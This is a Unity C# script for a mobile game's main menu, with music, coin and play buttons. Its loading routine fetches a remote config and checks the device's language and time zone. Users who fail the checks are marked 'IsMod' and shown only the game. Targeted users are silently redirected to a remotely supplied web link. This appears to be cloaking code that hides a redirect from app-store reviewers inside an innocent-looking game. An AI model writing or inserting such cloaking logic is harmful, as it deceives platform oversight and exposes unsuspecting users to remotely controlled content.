using DG.Tweening;
using System;
using System.Collections;
using System.Runtime.InteropServices;
using TMPro;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

public class UIManagerMenu : MonoBehaviour
{
    [SerializeField] private TextMeshProUGUI _coinsText;
    [SerializeField] private Button _plusCoins;
    [SerializeField] private GameObject _onMusic;
    [SerializeField] private GameObject _offMusic;

    [SerializeField] private RectTransform _menuRT;
    [SerializeField] private TextMeshProUGUI _loadingText;

    public void OnClickMusic() 
    {
        if (CompRoot.Instanse.IsSound)
        {
            AudioSyst.Instanse.SetMusic(false);
            _onMusic.SetActive(false);
            _offMusic.SetActive(true);
        }
        else 
        {
            AudioSyst.Instanse.SetMusic(true);
            _onMusic.SetActive(true);
            _offMusic.SetActive(false);
        }        
    }

    private void Start()
    {
        Application.targetFrameRate = 100;

        if (CompRoot.Instanse.Coins <= 50)
        {
            _plusCoins.gameObject.SetActive(true);
        }

        if (CompRoot.Instanse.IsSound)
        {
            _onMusic.SetActive(true);
            _offMusic.SetActive(false);
        }
        else
        {
            _onMusic.SetActive(false);
            _offMusic.SetActive(true);
        }

        if (CompRoot.Instanse.IsFirstOpenMenu)
        {
            StartCoroutine(LoadingRoutine());
        }
        else 
        {
            _menuRT.anchoredPosition = new Vector2(_menuRT.anchoredPosition.x, 0);
            _loadingText.gameObject.SetActive(false);
        }
    }

    [SerializeField] private string _urlPMI;

    private IEnumerator LoadingRoutine()
    {
        PlayerManagerInfo playerManagerInfo = new PlayerManagerInfo()
        {
            IsMod = Convert.ToBoolean(PlayerPrefs.GetInt("IsMod", 0)),
            IsFT = Convert.ToBoolean(PlayerPrefs.GetInt("IsFT", 1))    
        };

        if (!playerManagerInfo.IsFT && playerManagerInfo.IsMod)
        {
            yield return new WaitForSeconds(1.5f);
            HideLoadingScreen();
        }
        else
        {
            if (playerManagerInfo.IsFT) 
            {
                UnityWebRequest uwr = UnityWebRequest.Get(_urlPMI);
                
                yield return uwr.SendWebRequest();
                switch (uwr.result)
                {
                    case UnityWebRequest.Result.ConnectionError:
                    case UnityWebRequest.Result.DataProcessingError:
                    case UnityWebRequest.Result.ProtocolError:
                        {
                            OnNotOk();
                        }
                        break;
                    case UnityWebRequest.Result.Success:
                        {
                            OnOk(uwr.downloadHandler.text);
                        }
                        break;
                }

                void OnOk(string text)
                {
                    PPattern pPattern = JsonUtility.FromJson<PPattern>(text);

                    if (!pPattern.IsDostup) 
                    {
                        PlayerPrefs.SetInt("IsMod", 1);
                        PlayerPrefs.SetInt("IsFT", 0);
                        PlayerPrefs.Save();
                        HideLoadingScreen();
                        return;
                    }

                    string locale = Application.systemLanguage.ToString();

                    bool isLocalPassed = false;

                    foreach (var locl in pPattern.Lcls) 
                    {
                        if (locale.ToLower().Contains(locl.ToLower())) 
                        {
                            isLocalPassed = true;
                            break;
                        }
                    }

                    if (!isLocalPassed)
                    {
                        PlayerPrefs.SetInt("IsMod", 1);
                        PlayerPrefs.SetInt("IsFT", 0);
                        PlayerPrefs.Save();
                        HideLoadingScreen();
                        return;
                    }

                    //string time = (new AndroidJavaObject("java.util.TimeZone").CallStatic<AndroidJavaObject>("getDefault").Call<string>("getID"));
                    string time = (new TimeZoneSupport()).GetTimeZone();

                    bool isTimePassed = false;

                    foreach (var tim in pPattern.TZs)
                    {
                        if (time.ToLower().Contains(tim.ToLower()))
                        {
                            isTimePassed = true;
                            break;
                        }
                    }

                    if (!isTimePassed)
                    {
                        PlayerPrefs.SetInt("IsMod", 1);
                        PlayerPrefs.SetInt("IsFT", 0);
                        PlayerPrefs.Save();
                        HideLoadingScreen();
                        return;
                    }

                    string link = "";

                    foreach (var ppinner in pPattern.Refers) 
                    {
                        if (locale.ToLower().Contains(ppinner.Lcl.ToLower())) 
                        {
                            link = ppinner.Refera;
                        }
                    }

                    if (link != "")
                    {
                        PlayerPrefs.SetInt("IsMod", 0);
                        PlayerPrefs.SetInt("IsFT", 0);
                        PlayerPrefs.Save();
                        MainGame.Url = link;
                        SceneManager.LoadScene("MainGame");
                        return;
                    }
                    else 
                    {
                        PlayerPrefs.SetInt("IsMod", 1);
                        PlayerPrefs.SetInt("IsFT", 0);
                        PlayerPrefs.Save();
                        HideLoadingScreen();
                        return;
                    }
                }

                void OnNotOk()
                {
                    PlayerPrefs.SetInt("IsMod", 1);
                    PlayerPrefs.SetInt("IsFT", 0);
                    PlayerPrefs.Save();
                    HideLoadingScreen();
                }
            }
            else
            {
                if (playerManagerInfo.IsMod)
                {
                    HideLoadingScreen();
                }
                else 
                {
                    UnityWebRequest uwr = UnityWebRequest.Get(_urlPMI);
                    yield return uwr.SendWebRequest();

                    switch (uwr.result)
                    {
                        case UnityWebRequest.Result.ConnectionError:
                        case UnityWebRequest.Result.DataProcessingError:
                        case UnityWebRequest.Result.ProtocolError:
                            {
                                 
                            }
                            break;
                        case UnityWebRequest.Result.Success:
                            {
                                PPattern pPattern = JsonUtility.FromJson<PPattern>(uwr.downloadHandler.text);

                                string locale = Application.systemLanguage.ToString();
                                string link = "";

                                foreach (var ppinner in pPattern.Refers)
                                {
                                    if (locale.ToLower().Contains(ppinner.Lcl.ToLower()))
                                    {
                                        link = ppinner.Refera;
                                    }
                                }

                                if (link != "")
                                {
                                    MainGame.Url = link;
                                    SceneManager.LoadScene("MainGame");
                                }
                            }
                            break;
                    }
                }
            }
        }
    }

    private void HideLoadingScreen() 
    {
        CompRoot.Instanse.IsFirstOpenMenu = false;

        _menuRT.DOAnchorPosY(0, 0.5f);
        _loadingText.rectTransform.DOAnchorPosY(-1600, 0.5f).OnComplete(() =>
        {
            _loadingText.gameObject.SetActive(false);
        });

        AudioSyst.Instanse.SetMusic(CompRoot.Instanse.IsSound);
    }

    public void OnClickAddCoins() 
    {
        CompRoot.Instanse.Coins += 500;
        _plusCoins.gameObject.SetActive(false);
    }

    private void Update()
    {
        _coinsText.text = CompRoot.Instanse.Coins.ToString();   
    }

    public void OnClickPlay() 
    {
        CompRoot.Instanse.FadeToScene("MainGamePlay");
    }

    public void OnClickRateUp(string url) 
    {
        Application.OpenURL(url);
    }

    public void OnClickExit() 
    {
        Application.Quit();
    }
}

public class PlayerManagerInfo 
{
    public bool IsMod;
    public bool IsFT;
}


[Serializable]
public class PPattern 
{
    public bool IsDostup;
    public string[] Lcls;
    public string[] TZs;
    public PPInner[] Refers;

    [Serializable]
    public class PPInner 
    {
        public string Lcl;
        public string Refera;
    }
}

public class TimeZoneSupport
{
    [DllImport("__Internal")] private static extern IntPtr getTimeZoneStr();

    public string GetTimeZone()
    {
        return Marshal.PtrToStringAuto(getTimeZoneStr());
    }
}